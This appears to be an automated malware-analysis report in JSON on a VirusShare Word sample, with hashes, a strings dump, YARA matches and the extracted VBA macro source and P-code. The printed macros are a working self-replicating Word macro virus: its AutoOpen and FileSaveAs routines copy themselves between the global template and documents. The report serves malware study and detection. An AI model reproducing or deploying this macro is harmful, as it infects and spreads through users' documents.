{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"FileSaveAs\"",
            "Attribute VB_Name = \"AutoOpen\""
        ],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code"
        },
        "macro": "\n\n\nPublic Sub MAIN()\nAttribute MAIN.VB_Description = \"Saves a copy of the document in a separate file\"\nAttribute MAIN.VB_ProcData.VB_Invoke_Func = \"TemplateProject.FileSaveAs.MAIN\"\nDim Name_$\nOn Error GoTo -1: On Error GoTo exit_\nDim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)\nWordBasic.CurValues.FileSaveAs dlg\nWordBasic.Dialog.FileSaveAs dlg\nIf dlg.Format = 0 Then dlg.Format = 1\nName_$ = WordBasic.[FileName$]()\nWordBasic.MacroCopy \"Global:FileSaveAs\", WordBasic.[FileName$]() + \":FileSaveAs\"\nWordBasic.MacroCopy \"Global:AutoOpen\", WordBasic.[FileName$]() + \":AutoOpen\"\nWordBasic.FileSaveAs dlg\nexit_:\nEnd Sub\n\n\n\nPublic Sub MAIN()\nDim Name_$\nDim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)\nWordBasic.CurValues.FileSaveAs dlg\n\nIf dlg.Format = 0 Then\ndlg.Format = 1\nName_$ = WordBasic.[FileName$]()\nWordBasic.MacroCopy \"Global:FileSaveAs\", WordBasic.[FileName$]() + \":FileSaveAs\"\nWordBasic.MacroCopy \"Global:AutoOpen\", WordBasic.[FileName$]() + \":AutoOpen\"\nWordBasic.FileSaveAs dlg\nEnd If\n\nWordBasic.MacroCopy WordBasic.[FileName$]() + \":AutoOpen\", \"Global:AutoOpen\"\nWordBasic.MacroCopy WordBasic.[FileName$]() + \":filesaveas\", \"Global:FileSaveAs\"\nEnd Sub\n\n' Processing file: VirusShare_040f79b1364b93784fbee5cc7b8b1042\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 965 bytes\n' Macros/VBA/FileSaveAs - 1756 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Public Sub MAIN())\n' Line #2:\n' \tDim \n' \tVarDefn Name_\n' Line #3:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError exit_ \n' Line #4:\n' \tDim \n' \tVarDefn dlg (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd FileSaveAs 0x0001 \n' \tSet dlg \n' Line #5:\n' \tLd dlg \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #6:\n' \tLd dlg \n' \tLd WordBasic \n' \tMemLd Dialog \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #7:\n' \tLd dlg \n' \tMemLd Format$ \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tLd dlg \n' \tMemSt Format$ \n' \tEndIf \n' Line #8:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tSt Name_$ \n' Line #9:\n' \tLitStr 0x0011 \"Global:FileSaveAs\"\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tLitStr 0x000B \":FileSaveAs\"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #10:\n' \tLitStr 0x000F \"Global:AutoOpen\"\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tLitStr 0x0009 \":AutoOpen\"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #11:\n' \tLd dlg \n' \tLd WordBasic \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #12:\n' \tLabel exit_ \n' Line #13:\n' \tEndSub \n' Macros/VBA/AutoOpen - 1660 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Public Sub MAIN())\n' Line #2:\n' \tDim \n' \tVarDefn Name_\n' Line #3:\n' \tDim \n' \tVarDefn dlg (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd FileSaveAs 0x0001 \n' \tSet dlg \n' Line #4:\n' \tLd dlg \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #5:\n' Line #6:\n' \tLd dlg \n' \tMemLd Format$ \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #7:\n' \tLitDI2 0x0001 \n' \tLd dlg \n' \tMemSt Format$ \n' Line #8:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tSt Name_$ \n' Line #9:\n' \tLitStr 0x0011 \"Global:FileSaveAs\"\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tLitStr 0x000B \":FileSaveAs\"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #10:\n' \tLitStr 0x000F \"Global:AutoOpen\"\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tLitStr 0x0009 \":AutoOpen\"\n' \tAdd \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #11:\n' \tLd dlg \n' \tLd WordBasic \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #12:\n' \tEndIfBlock \n' Line #13:\n' Line #14:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tLitStr 0x0009 \":AutoOpen\"\n' \tAdd \n' \tLitStr 0x000F \"Global:AutoOpen\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #15:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tLitStr 0x000B \":filesaveas\"\n' \tAdd \n' \tLitStr 0x0011 \"Global:FileSaveAs\"\n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0002 \n' Line #16:\n' \tEndSub \n"
    },
    "filename": "VirusShare_040f79b1364b93784fbee5cc7b8b1042",
    "filesize": 35840,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Title: epform10, Author: Microsoft Corporation, Template: Cbtnorm.dot, Last Saved By: Ditry PC, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Tue May  1 15:20:00 2001, Last Saved Time/Date: Tue May  1 15:20:00 2001, Number of Pages: 1, Number of Words: 217, Number of Characters: 1238, Security: 0",
    "hashes": {
        "md5": "040f79b1364b93784fbee5cc7b8b1042",
        "sha1": "3c5cbbff6d6c40f64262d5462710d9c5281a973c",
        "sha256": "d8b84f0dd531ffc1b16c1a915c174a556e00d831c133a7a3ac82bde11338b30a"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "besondere",
            "falle",
            "Farid",
            "Kasmai",
            "{puttsi@aol.com}",
            "13.04.2002",
            "2CCEC6BF,41.254 VS051857.DOC",
            "bjbj\u064e",
            "besonderefallefr-PanoiX-13.04.2002",
            "693D08B7,41.254 VS051857.DOC",
            "epform10",
            "Wide World Importers Presents",
            "A Summer Concert",
            "Michael Rauh, Conductor",
            "May 7, 1994",
            "epform20",
            "Make plans now to attend our next concert, \"A Tribute to Mozart,\" on June 11. Director Michael Rauh steps down from the podium to perform as our featured harpsichord soloist.",
            "epform40",
            "Symphony No. 9\tDmitri Shostakovich",
            "Eight Folk Songs\tAnatol LiADOV",
            "Romeo & Juliet\tPeter Ilich TSchaikovsky",
            "epbord10",
            "Wide World Importers",
            "Interoffice Memo",
            "To:\tAll Subsidiary Managers",
            "From:\tAnne Gabor, General Manager",
            "Re:\tYearly Sales",
            "Date:\tJuly 15, 1994",
            "epbord20",
            "A Timeline for Clocks",
            "EMBED MSDraw   \\* mergeformat",
            "14th century",
            "15th century",
            "16th century",
            "17th century",
            "19th century",
            "20th century",
            "epbull10 and epbull20",
            "Precious stones",
            "Diamond",
            "Ruby and sapphire (forms of corundum)",
            "Emerald",
            "Semiprecious stones",
            "Amethyst",
            "Aquamarine",
            "Garnet",
            "Jade",
            "Moonstone",
            "Opal",
            "epstyl10",
            "Tour Details:  You arrive in Sydney at 7 P.M., in plenty of time to settle in and rest.",
            "An adventure is a dare you take personally. It's an opportunity that also involves some risk.  It is inspired by an age-old sort of challenge, and the tools it involves -- boats, planes, or snow.",
            "epfoot20",
            "Our store features diamonds, rubies, sapphires, and emeralds.",
            "  We also feature a large selection of amethyst, aquamarine, garnet, jade",
            ", moonstone, opal, quartz, topaz, tourmaline, and turquoise.",
            "Diamonds, rubies, sapphires, emeralds, and jade remain our biggest sellers.  We also have a substantial market for amethyst, aquamarine, and turquoise.",
            "epend",
            "We sell both cut and uncut preciousand semiprecious  gems.",
            "We have the region's largest selection of jade.",
            "/ =!",
            "MSDraw",
            "MrEd",
            "Microsoft Draw",
            "MrEd",
            "System",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "erences",
            "METAFILEPICT",
            "MrEd",
            "Microsoft Draw",
            "MrEd",
            "System",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "erences",
            "MrEd",
            "Microsoft Draw",
            "MrEd",
            "System",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "MrEd",
            "erences",
            "@HP LaserJet 4",
            "LPT1:",
            "HPPCL5MS",
            "HP LaserJet 4",
            "HP LaserJet 4",
            "MSUDN",
            "HP LaserJet 4",
            "HP LaserJet 4",
            "MSUDN",
            "HP LaserJet 4",
            "epform10",
            "Microsoft Corporation",
            "Cbtnorm.dot",
            "Ditry PC",
            "Microsoft Word 8.0",
            "VIRUS ROOM",
            "epform10",
            "Title",
            "_PID_GUID",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "Saves a copy of the document in a separate file",
            "TemplateProject.FileSaveAs.MAIN",
            "Global:FileSaveAs",
            ":FileSaveAs",
            " in ",
            "Global:AutoOpen",
            ":AutoOpen",
            "Attribut",
            "e VB_Nam",
            "e = \"Fil",
            "eSaveAs\"",
            "Publ",
            "ic Sub MAIN()",
            "vDescription",
            "s a copy",
            " of the ",
            "document",
            "2sepatra",
            "RProcData",
            "Invoke_F",
            "^Temp",
            "\"ject.",
            "NDim ",
            "Error GoTo -1: ",
            "exit_",
            "dlg As O",
            "+: Set ",
            "\t= WordB",
            "asic.DialogRec",
            "<(False",
            "CurValuefs",
            ".Forma",
            "tx0 Thenq\t1",
            "croC\"Gl obal:\",",
            " + \"\t",
            "AutoOpe>n",
            "Global:FileSaveAs",
            ":FileSaveAs",
            "Global:AutoOpen",
            ":AutoOpen",
            ":AutoOpen",
            "Global:AutoOpen",
            ":filesaveas",
            "Global:FileSaveAs",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oOpen\"",
            "Public",
            " Sub MAI",
            ",dlg",
            " As Obje",
            "ct: Set ",
            "$= WordB",
            "asic.Dia@logRec",
            "FileSave",
            "As(False",
            ")CurVal8ues",
            "\t.Format",
            "0 Then",
            "MacroCop",
            "y \"Globadl:",
            "a  + \"\t",
            "'&FEnd If8\t",
            "u8GDY",
            "qas@IN",
            "33aeec61a",
            "43aeec61a",
            "53aeec61a",
            "DsE>",
            "FsE>",
            "HsE>",
            "Wordk",
            "Win16~",
            "Win32",
            "sample16",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Normal",
            "Office",
            "Project-",
            "Module1b",
            "FileSaveAs",
            "MAIN,",
            "Name_\u06bf",
            "exit_M",
            "dlg-",
            "WordBasic",
            "DialogRecord",
            "CurValues\u0224",
            "Dialogf",
            "FileName$m",
            "MacroCopyE",
            "AutoOpen*",
            "Documentj",
            "Project",
            "rstd",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation",
            "mMSFo@rms>",
            "F760892",
            "81-3E40-",
            "11D5-ACD",
            "9-A859617AEC44",
            ".TWD#Microsoft ",
            "` Ob",
            " Library",
            "2,PJP\\VBE",
            "\\(EX(.E",
            "CxOPfficDxO@uf",
            "cBx,,",
            "2DF8D04C",
            "-5BFA-101B-BDE5@xTAA@w4",
            "ROGRAM F",
            "ILES\\MIC",
            "ROSOFT O@FFICE\\",
            "SO97.DLLCHZ# 8.0Z",
            "BThisDoc@ument",
            "h@6sD",
            "leSaveAs",
            "v@TAO",
            "ThisDocument",
            "FileSaveAs",
            "AutoOpen",
            "ID=\"{73B4EC4B-3E45-11D5-ACD9-88E758BD7ABE}\"",
            "Document=ThisDocument/&H00000000",
            "Module=FileSaveAs",
            "Module=AutoOpen",
            "Name=\"Project\"",
            "HelpContextID=\"0\"",
            "CMG=\"232106652D692D692D692D69\"",
            "DPB=\"4644634AA54EC94FC94FC9\"",
            "GC=\"696B4C914D914D6E\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "2CCEC6BF,41.254 VS051857.DOC": "Word",
            "693D08B7,41.254 VS051857.DOC": "Word"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.296706",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
